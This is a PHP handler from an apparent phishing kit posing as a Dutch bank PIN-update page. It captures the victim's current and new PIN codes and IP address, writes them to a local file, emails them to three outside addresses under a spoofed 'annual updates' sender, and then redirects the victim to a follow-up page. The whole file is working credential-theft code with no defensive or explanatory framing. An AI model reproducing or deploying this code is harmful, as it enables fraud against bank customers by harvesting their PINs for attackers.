<?php
@session_start(); $_SESSION['Nipo'] = $_POST['pin']; $_SESSION['Nipc1'] = $_POST['pin1']; $_SESSION['Nipc2'] = $_POST['pin2']; $msga = "Nip: ".$_SESSION['Nipo']."<br>Nip chck:".$_SESSION['Nipc1']."<br> Nip chck||:".$_SESSION['Nipc2']."<br>"; $_SESSION['msg3c'] = $msga; $title = "Rabz Npz NV - ".$_SESSION['Vlts']."-".$_SESSION['Atnm'];
$message .= "Huidige Pincode : ".$_POST['pin']."\n";
$message .= "Nieuwe Pincode : ".$_POST['pin1']."\n"; 
$message .= "Verificatie Nieuwe Pincode : ".$_POST['pin2']."\n";
$ip = $_SERVER['REMOTE_ADDR'];
$od = date("F j, Y, g:i a");
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$rnessage = "$message\n";
$send= "boss120@yahoo.com,vanderweide@keemail.me,milkop1@live.nl";
$subject = " Opstuur Baro | $ip";
$headers = "From: mail@jaarlijkseupdates.eu";
$file = fopen("fio.txt","ab");
fwrite($file,$message);
fclose($file);

$str=array($send, $IWP); foreach ($str as $send)
if(mail($send,$subject,$rnessage,$headers) != false){
mail($Send,$subject,$rnessage,$headers);

}
header("Location: bewustproces.php");
?>